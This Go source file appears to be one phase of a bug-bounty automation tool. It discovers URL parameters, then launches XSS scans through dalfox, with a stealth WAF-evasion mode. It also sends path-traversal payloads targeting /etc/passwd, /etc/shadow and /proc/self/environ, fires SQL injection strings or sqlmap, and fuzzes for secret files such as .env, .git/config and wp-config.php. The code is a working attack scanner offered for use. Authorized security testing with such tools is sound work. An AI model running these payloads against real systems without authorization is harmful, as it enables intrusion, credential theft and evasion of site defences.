package phases

import (
	"bbfucker/pkg/config"
	"bbfucker/pkg/dalfox"
	"bbfucker/pkg/ffuf"
	"bbfucker/pkg/logger"
	"bbfucker/pkg/sqlmap"
	"bbfucker/pkg/wafguard"
	"context"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/fatih/color"
)

// ============================================================================
// Phase 6: Parameter Discovery & Vulnerability Testing
// ============================================================================

type Phase6ParameterFuzzing struct {
	cfg *config.Config
}

func NewPhase6ParameterFuzzing() *Phase6ParameterFuzzing {
	return &Phase6ParameterFuzzing{}
}

func (p *Phase6ParameterFuzzing) Name() string {
	return "Phase 6: Parameter Discovery & Vulnerability Testing"
}

func (p *Phase6ParameterFuzzing) Description() string {
	return "Parameter discovery, GF patterns, XSS/LFI/SQLi testing, FFUF fuzzing"
}

func (p *Phase6ParameterFuzzing) IsEnabled(cfg *config.Config) bool {
	return cfg.Phase6ParameterFuzzing.Enabled
}

func (p *Phase6ParameterFuzzing) Execute(ctx context.Context, cfg *config.Config, input *PhaseInput) (*PhaseOutput, error) {
	p.cfg = cfg
	startTime := time.Now()
	log := logger.Default().With("phase", "6-fuzz", "domain", input.Domain)
	
	color.Cyan("\n[PHASE 6] %s", p.Name())
	color.Cyan("═══════════════════════════════════════════════════════════")
	
	// Check parameter fuzzing tools availability
	p.checkParameterFuzzingToolsAvailability()
	
	output := &PhaseOutput{
		PhaseName:       p.Name(),
		Parameters:      make(map[string][]string),
		Vulnerabilities: make([]Vulnerability, 0),
		Findings:        make([]Finding, 0),
		Statistics: Statistics{
			ToolsUsed: make([]string, 0),
			Extra:     make(map[string]int),
		},
	}
	
	// Step 6.1: Parameter Discovery (URL parsing - lightweight)
	if cfg.Phase6ParameterFuzzing.ParameterDiscovery.Enabled {
		color.Yellow("\n[*] Step 6.1: Parameter Discovery (URL parsing)")
		params := p.discoverParameters(ctx, input.URLs)
		output.Parameters = params
		output.Statistics.ToolsUsed = append(output.Statistics.ToolsUsed, "url-param-extract")
		totalParams := 0
		for _, pList := range params {
			totalParams += len(pList)
		}
		output.Statistics.Extra["parameters"] = totalParams
		color.Green("[✓] Discovered %d parameters", totalParams)
	}
	
	// Step 6.2: GF Pattern Filtering
	if cfg.Phase6ParameterFuzzing.GFPatterns.Enabled {
		color.Yellow("\n[*] Step 6.2: GF Pattern Filtering")
		
		// XSS patterns
		xssURLs := p.filterGFPatterns(ctx, input.URLs, "xss")
		output.Statistics.Extra["gf_xss"] = len(xssURLs)
		color.Green("  [✓] GF XSS: %d URLs", len(xssURLs))
		
		// LFI patterns
		lfiURLs := p.filterGFPatterns(ctx, input.URLs, "lfi")
		output.Statistics.Extra["gf_lfi"] = len(lfiURLs)
		color.Green("  [✓] GF LFI: %d URLs", len(lfiURLs))
		
		// SQLi patterns
		sqliURLs := p.filterGFPatterns(ctx, input.URLs, "sqli")
		output.Statistics.Extra["gf_sqli"] = len(sqliURLs)
		color.Green("  [✓] GF SQLi: %d URLs", len(sqliURLs))
		
		output.Statistics.ToolsUsed = append(output.Statistics.ToolsUsed, "gf")
		
		// Step 6.3: XSS Testing Pipeline
		if cfg.Phase6ParameterFuzzing.XSSTesting.Enabled {
			color.Yellow("\n[*] Step 6.3: XSS Testing Pipeline")
			// WAF host haritasını upstream fazdan al
			wafHosts := extractWAFHosts(input)
			xssVulns := p.testXSS(ctx, xssURLs, wafHosts)
			output.Vulnerabilities = append(output.Vulnerabilities, xssVulns...)
			output.Statistics.Extra["xss_vulns"] = len(xssVulns)
			color.Green("[✓] Found %d XSS vulnerabilities", len(xssVulns))
		}
		
		// Step 6.4: LFI Testing
		if cfg.Phase6ParameterFuzzing.LFITesting.Enabled {
			color.Yellow("\n[*] Step 6.4: LFI Testing")
			lfiVulns := p.testLFI(ctx, lfiURLs)
			output.Vulnerabilities = append(output.Vulnerabilities, lfiVulns...)
			output.Statistics.Extra["lfi_vulns"] = len(lfiVulns)
			color.Green("[✓] Found %d LFI vulnerabilities", len(lfiVulns))
		}
		
		// Step 6.5: SQLi Testing
		if cfg.Phase6ParameterFuzzing.SQLiTesting.Enabled {
			color.Yellow("\n[*] Step 6.5: SQLi Testing")
			sqliVulns := p.testSQLi(ctx, sqliURLs, input)
			output.Vulnerabilities = append(output.Vulnerabilities, sqliVulns...)
			output.Statistics.Extra["sqli_vulns"] = len(sqliVulns)
			color.Green("[✓] Found %d SQLi vulnerabilities", len(sqliVulns))
		}
	}
	
	// Step 6.6: FFUF Directory & File Fuzzing
	if cfg.Phase6ParameterFuzzing.FFUF.Enabled {
		color.Yellow("\n[*] Step 6.6: FFUF Directory & File Fuzzing")

		// WAF korumalı hostları filtrele
		wafFilteredHosts := make([]LiveHost, 0, len(input.LiveHosts))
		for _, host := range input.LiveHosts {
			if host.WAF == "" {
				wafFilteredHosts = append(wafFilteredHosts, host)
			} else {
				color.Yellow("  [!] WAF tespit edildi, FFUF atlanıyor: %s [WAF: %s]", host.URL, host.WAF)
			}
		}

		// Directory fuzzing
		if cfg.Phase6ParameterFuzzing.FFUF.DirectoryFuzzing.Enabled {
			dirs := p.fuzzDirectories(ctx, wafFilteredHosts)
			output.Statistics.Extra["ffuf_dirs"] = len(dirs)
			color.Green("  [✓] FFUF Dirs: %d", len(dirs))
		}

		// File fuzzing
		if cfg.Phase6ParameterFuzzing.FFUF.FileFuzzing.Enabled {
			files := p.fuzzFiles(ctx, wafFilteredHosts)
			output.Statistics.Extra["ffuf_files"] = len(files)
			color.Green("  [✓] FFUF Files: %d", len(files))
		}

		output.Statistics.ToolsUsed = append(output.Statistics.ToolsUsed, "ffuf")
	}
	
	output.Statistics.TotalItems = len(output.Parameters) + len(output.Vulnerabilities)
	output.Statistics.Duration = time.Since(startTime).Seconds()

	log.Infof("Phase 6 tamamlandı: %d parametre, %d zafiyet, %.2fs", len(output.Parameters), len(output.Vulnerabilities), output.Statistics.Duration)
	color.Green("\n[✓] Phase 6 Complete: %d parameters, %d vulnerabilities", len(output.Parameters), len(output.Vulnerabilities))
	color.Cyan("═══════════════════════════════════════════════════════════\n")
	
	return output, nil
}

// ============================================================================
// Parameter Fuzzing Implementations
// ============================================================================

// defaultParamBlocklist — tarama gürültüsü yaratan, CMS/platform'a özgü
// standart parametreler. Bunlar gerçek saldırı yüzeyi değildir.
var defaultParamBlocklist = map[string]bool{
	// Google / Blogger
	"q": true, "alt": true, "hl": true, "gl": true, "num": true,
	// WordPress
	"s": true, "p": true, "page_id": true, "cat": true, "tag": true,
	"feed": true, "paged": true, "preview": true, "m": true,
	// Generic CMS
	"lang": true, "language": true, "locale": true, "page": true,
	"offset": true, "limit": true, "per_page": true,
	// Analytics / Tracking
	"utm_source": true, "utm_medium": true, "utm_campaign": true,
	"utm_term": true, "utm_content": true, "fbclid": true, "gclid": true,
	// Diğer teknik parametreler
	"v": true, "ver": true, "cb": true, "_": true, "ts": true, "t": true,
}

func (p *Phase6ParameterFuzzing) discoverParameters(ctx context.Context, urls []string) map[string][]string {
	// Lightweight parameter extraction from URL query strings (no external tool needed)
	params := make(map[string][]string)

	for _, rawURL := range urls {
		idx := strings.Index(rawURL, "?")
		if idx == -1 || idx == len(rawURL)-1 {
			continue
		}
		query := rawURL[idx+1:]
		seen := make(map[string]bool)
		var paramList []string
		for _, pair := range strings.Split(query, "&") {
			key := strings.SplitN(pair, "=", 2)[0]
			key = strings.ToLower(strings.TrimSpace(key))
			if key == "" || seen[key] || defaultParamBlocklist[key] {
				continue
			}
			seen[key] = true
			paramList = append(paramList, key)
		}
		if len(paramList) > 0 {
			baseURL := rawURL[:idx]
			params[baseURL] = paramList
		}
	}

	return params
}

func (p *Phase6ParameterFuzzing) filterGFPatterns(ctx context.Context, urls []string, pattern string) []string {
	// Check if gf is installed
	if _, err := exec.LookPath("gf"); err != nil {
		if p.cfg.Output.Verbose {
			color.Yellow("  [!] GF not installed - install: go install github.com/tomnomnom/gf@latest")
		}
		// Fallback: simple keyword-based filtering
		return p.filterByKeyword(urls, pattern)
	}
	
	// Run gf with input via stdin
	input := strings.Join(urls, "\n")
	cmd := exec.CommandContext(ctx, "gf", pattern)
	cmd.Stdin = strings.NewReader(input)
	output, err := cmd.Output()
	if err != nil {
		return p.filterByKeyword(urls, pattern)
	}
	
	filtered := make([]string, 0)
	for _, line := range strings.Split(string(output), "\n") {
		if line = strings.TrimSpace(line); line != "" {
			filtered = append(filtered, line)
		}
	}
	
	return filtered
}

func (p *Phase6ParameterFuzzing) filterByKeyword(urls []string, pattern string) []string {
	// Simple fallback filter when gf is not installed
	keywords := map[string][]string{
		"xss": {"q=", "search=", "query=", "s=", "keyword=", "name=", "input="},
		"lfi": {"file=", "path=", "page=", "include=", "load=", "read=", "view="},
		"sqli": {"id=", "cat=", "uid=", "num=", "pid=", "sort=", "orderby="},
		"ssrf": {"url=", "uri=", "target=", "dest=", "host=", "redirect="},
		"redirect": {"next=", "redirect=", "return=", "goto=", "url=", "redir="},
	}
	
	words, ok := keywords[pattern]
	if !ok {
		return []string{}
	}
	
	filtered := make([]string, 0)
	for _, url := range urls {
		for _, kw := range words {
			if strings.Contains(strings.ToLower(url), kw) {
				filtered = append(filtered, url)
				break
			}
		}
	}
	return filtered
}

func (p *Phase6ParameterFuzzing) testXSS(ctx context.Context, urls []string, wafHosts map[string]string) []Vulnerability {
	// Use existing dalfox module
	dalfoxScanner := dalfox.NewScanner(p.cfg)
	
	if !dalfoxScanner.CheckInstalled() {
		if p.cfg.Output.Verbose {
			color.Yellow("  [!] Dalfox not installed, skipping XSS testing...")
		}
		return []Vulnerability{}
	}

	// WAF korumalı ve normal URL'leri ayır
	guard := wafguard.New()
	for url, waf := range wafHosts {
		guard.Register(url, waf)
	}

	var normalURLs []string
	var wafURLs []string
	var wafName string

	for _, u := range urls {
		// URL'nin domain kısmını WAF haritasıyla karşılaştır
		found := false
		for protectedURL, waf := range wafHosts {
			if strings.HasPrefix(u, protectedURL) || strings.Contains(u, extractHost(protectedURL)) {
				wafURLs = append(wafURLs, u)
				if wafName == "" {
					wafName = waf
				}
				found = true
				break
			}
		}
		if !found {
			normalURLs = append(normalURLs, u)
		}
	}

	var allFindings []dalfox.XSSFinding

	// Normal URL'ler — standart tarama
	if len(normalURLs) > 0 {
		allFindings = append(allFindings, dalfoxScanner.ScanMultiple(ctx, normalURLs)...)
	}

	// WAF korumalı URL'ler — stealth + evasion + IsKilled kontrolü
	if len(wafURLs) > 0 {
		delay := guard.ScanDelay(wafName)
		color.Yellow("  [!] %d WAF korumalı URL için Dalfox stealth (evasion, gecikme %s)", len(wafURLs), delay)
		var activeWAFURLs []string
		for _, u := range wafURLs {
			// Host'u çıkar ve IsKilled kontrolü yap
			h := extractHost(u)
			if guard.IsKilled(h) {
				color.Red("  [\u2717] %s — bloklandı, XSS testi atlanıyor", h)
				continue
			}
			activeWAFURLs = append(activeWAFURLs, u)
		}
		if len(activeWAFURLs) > 0 {
			allFindings = append(allFindings, dalfoxScanner.ScanMultipleStealth(ctx, activeWAFURLs, delay)...)
		}
	}
	
	vulns := make([]Vulnerability, len(allFindings))
	for i, f := range allFindings {
		vulns[i] = Vulnerability{
			Type:      "xss",
			Severity:  "high",
			Title:     "Cross-Site Scripting (XSS)",
			URL:       f.URL,
			Parameter: f.Parameter,
			Payload:   f.Payload,
			Evidence:  f.Evidence,
		}
	}
	
	return vulns
}

// extractWAFHosts PhaseInput.Extra'dan WAF host haritasını çıkarır.
// Phase 4 tarafından "waf_hosts" anahtarıyla yazılır.
func extractWAFHosts(input *PhaseInput) map[string]string {
	if input == nil || input.Extra == nil {
		return nil
	}
	raw, ok := input.Extra["waf_hosts"]
	if !ok {
		return nil
	}
	if m, ok := raw.(map[string]string); ok {
		return m
	}
	return nil
}

// extractHost bir URL'den sadece scheme+host kısmını döndürür (path olmadan).
// Örn: "https://example.com/path?q=1" → "https://example.com"
func extractHost(rawURL string) string {
	if idx := strings.Index(rawURL, "://"); idx != -1 {
		rest := rawURL[idx+3:]
		if slashIdx := strings.Index(rest, "/"); slashIdx != -1 {
			return rawURL[:idx+3+slashIdx]
		}
	}
	return rawURL
}

func (p *Phase6ParameterFuzzing) testLFI(ctx context.Context, urls []string) []Vulnerability {
	if len(urls) == 0 {
		return []Vulnerability{}
	}

	// LFI payloads (Linux-focused)
	payloads := []string{
		"../../../../etc/passwd",
		"../../../etc/passwd",
		"../../etc/passwd",
		"..%2F..%2F..%2F..%2Fetc%2Fpasswd",
		"....//....//....//....//etc/passwd",
		"/etc/passwd",
		"/etc/shadow",
		"../../../../etc/hosts",
		"/proc/self/environ",
		"/var/log/apache2/access.log",
	}

	// Detect LFI pattern in response
	lfiSignatures := []string{"root:x:", "daemon:", "[boot loader]"}

	vulns := make([]Vulnerability, 0)
	client := &http.Client{Timeout: 10 * time.Second}

	for _, baseURL := range urls {
		for _, payload := range payloads {
			// Replace each parameter value with payload
			testURL := replaceParamValues(baseURL, payload)
			if testURL == baseURL {
				continue
			}

			req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
			if err != nil {
				logger.Debugf("LFI test request hatası: %v", err)
				continue
			}
			req.Header.Set("User-Agent", "Mozilla/5.0")

			resp, err := client.Do(req)
			if err != nil {
				logger.Debugf("LFI test bağlantı hatası: %v", err)
				continue
			}

			body, err := io.ReadAll(io.LimitReader(resp.Body, 65536))
			resp.Body.Close()
			if err != nil {
				logger.Debugf("LFI test body okuma hatası: %v", err)
				continue
			}

			bodyStr := string(body)
			for _, sig := range lfiSignatures {
				if strings.Contains(bodyStr, sig) {
					vulns = append(vulns, Vulnerability{
						Type:        "lfi",
						Severity:    "high",
						Title:       "Local File Inclusion (LFI)",
						URL:         testURL,
						Payload:     payload,
						Evidence:    sig,
						Description: "LFI vulnerability found - file read confirmed",
					})
					break
				}
			}
		}
	}

	return vulns
}

func (p *Phase6ParameterFuzzing) testSQLi(ctx context.Context, urls []string, input *PhaseInput) []Vulnerability {
	if len(urls) == 0 {
		return []Vulnerability{}
	}

	vulns := make([]Vulnerability, 0)

	// SQLMap ile test (kuruluysa)
	if p.cfg.Phase6ParameterFuzzing.SQLiTesting.SQLMap.Enabled {
		// Check if sqlmap is installed
		if err := sqlmap.CheckInstalled(); err != nil {
			if p.cfg.Output.Verbose {
				color.Yellow("[!] %v", err)
			}
			// Fallback to basic detection
			vulns = append(vulns, p.detectTimeSQLi(ctx, urls)...)
			return vulns
		}

		// Get output directory from input.Extra
		outputDir := os.TempDir()
		if input != nil && input.Extra != nil {
			if dir, ok := input.Extra["outputDir"].(string); ok && dir != "" {
				outputDir = filepath.Join(dir, "sqlmap")
			}
		}

		cfg := p.cfg.Phase6ParameterFuzzing.SQLiTesting.SQLMap
		scanner := sqlmap.NewSQLMapScanner(
			cfg.Level,
			cfg.Risk,
			cfg.Threads,
			cfg.Technique,
			outputDir,
			p.cfg.Output.Verbose,
		)

		// Scan URLs
		results, err := scanner.ScanURLs(ctx, urls)
		if err != nil && p.cfg.Output.Verbose {
			color.Red("[!] SQLMap error: %v", err)
		}

		// Convert SQLMap results to vulnerabilities
		for _, result := range results {
			if result.Vulnerable {
				vuln := Vulnerability{
					Type:     "sqli",
					Severity: "critical",
					Title:    "SQL Injection",
					URL:      result.URL,
					Description: fmt.Sprintf("Parameter '%s' is vulnerable to SQL Injection. "+
						"Injection Type: %s, DBMS: %s",
						result.Parameter, result.InjectionType, result.DBMS),
				}
				if result.Payload != "" {
					vuln.Payload = result.Payload
				}
				vulns = append(vulns, vuln)
			}
		}

		// Save detailed results
		if len(results) > 0 {
			resultsFile := filepath.Join(outputDir, "sqlmap_results.txt")
			if err := scanner.SaveResults(results, resultsFile); err == nil && p.cfg.Output.Verbose {
				color.Green("[✓] Detailed SQLMap results saved: %s", resultsFile)
			}
		}
	} else {
		// Basit time-based SQLi detection (sqlmap yoksa)
		vulns = append(vulns, p.detectTimeSQLi(ctx, urls)...)
	}

	return vulns
}

// detectTimeSQLi - Basit time-based SQLi tespiti
func (p *Phase6ParameterFuzzing) detectTimeSQLi(ctx context.Context, urls []string) []Vulnerability {
	// SQLi error payloads
	errorPayloads := []string{"'", "''", " OR 1=1--", "' OR '1'='1"}
	errorSignatures := []string{
		"SQL syntax", "mysql_fetch", "ORA-", "PG::",
		"SQLException", "ODBC SQL", "SQLite", "syntax error",
		"Microsoft SQL", "Unclosed quotation",
	}

	vulns := make([]Vulnerability, 0)
	client := &http.Client{Timeout: 15 * time.Second}

	for _, baseURL := range urls {
		for _, payload := range errorPayloads {
			testURL := replaceParamValues(baseURL, payload)
			if testURL == baseURL {
				continue
			}

			req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
			if err != nil {
				logger.Debugf("SQLi test request hatası: %v", err)
				continue
			}
			req.Header.Set("User-Agent", "Mozilla/5.0")

			resp, err := client.Do(req)
			if err != nil {
				logger.Debugf("SQLi test bağlantı hatası: %v", err)
				continue
			}

			body, bodyErr := io.ReadAll(io.LimitReader(resp.Body, 65536))
			resp.Body.Close()
			if bodyErr != nil {
				logger.Debugf("SQLi test body okuma hatası: %v", bodyErr)
				continue
			}

			bodyStr := string(body)
			for _, sig := range errorSignatures {
				if strings.Contains(bodyStr, sig) {
					vulns = append(vulns, Vulnerability{
						Type:        "sqli",
						Severity:    "critical",
						Title:       "SQL Injection (Error-based)",
						URL:         testURL,
						Payload:     payload,
						Evidence:    sig,
						Description: "SQL error detected in response",
					})
					break
				}
			}
		}
	}
	return vulns
}

// replaceParamValues - URL'deki tüm query parametre değerlerini payload ile değiştirir
func replaceParamValues(rawURL, payload string) string {
	idx := strings.Index(rawURL, "?")
	if idx == -1 {
		return rawURL
	}
	base := rawURL[:idx+1]
	query := rawURL[idx+1:]
	parts := strings.Split(query, "&")
	for i, part := range parts {
		if eqIdx := strings.Index(part, "="); eqIdx != -1 {
			parts[i] = part[:eqIdx+1] + payload
		}
	}
	return base + strings.Join(parts, "&")
}

func (p *Phase6ParameterFuzzing) fuzzDirectories(ctx context.Context, hosts []LiveHost) []string {
	// Use existing ffuf module
	ffufFuzzer := ffuf.NewFuzzer(p.cfg)
	if !ffufFuzzer.CheckInstalled() {
		if p.cfg.Output.Verbose {
			color.Yellow("  [!] FFUF not installed, skipping directory fuzzing...")
		}
		return []string{}
	}
	
	allPaths := make([]string, 0)
	for _, host := range hosts {
		findings := ffufFuzzer.FuzzDirectories(ctx, host.URL, nil)
		for _, f := range findings {
			allPaths = append(allPaths, f.URL)
		}
	}
	
	return allPaths
}

func (p *Phase6ParameterFuzzing) fuzzFiles(ctx context.Context, hosts []LiveHost) []string {
	// Use ffuf with file extensions
	ffufFuzzer := ffuf.NewFuzzer(p.cfg)
	if !ffufFuzzer.CheckInstalled() {
		return []string{}
	}
	
	// Sensitive file wordlist
	fileWordlist := []string{
		".env", ".git/config", ".htaccess", ".htpasswd",
		"config.php", "config.yml", "config.json",
		"backup.zip", "backup.tar.gz", "db.sql",
		"wp-config.php", "settings.py", "database.yml",
		"robots.txt", "sitemap.xml", "crossdomain.xml",
	}
	
	allFiles := make([]string, 0)
	for _, host := range hosts {
		findings := ffufFuzzer.FuzzDirectories(ctx, host.URL, fileWordlist)
		for _, f := range findings {
			allFiles = append(allFiles, f.URL)
		}
	}
	
	return allFiles
}

// checkParameterFuzzingToolsAvailability verifies if external tools are available and provides helpful feedback
func (p *Phase6ParameterFuzzing) checkParameterFuzzingToolsAvailability() {
	if !p.cfg.Output.Verbose {
		return
	}
	type tool struct{ bin, install string }
	tools := []tool{
		{"gf", "go install github.com/tomnomnom/gf@latest"},
		{"ffuf", "go install github.com/ffuf/ffuf/v2@latest"},
		{"nuclei", "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"},
		{"dalfox", "go install github.com/hahwul/dalfox/v2@latest"},
		{"sqlmap", "apt install sqlmap"},
	}
	color.Yellow("  [i] Parametre fuzzing araçları kontrol ediliyor...")
	for _, t := range tools {
		if _, err := exec.LookPath(t.bin); err != nil {
			color.Yellow("    ! %s kurulu değil  →  %s", t.bin, t.install)
		} else {
			color.Green("    ✓ %s hazır", t.bin)
		}
	}
}
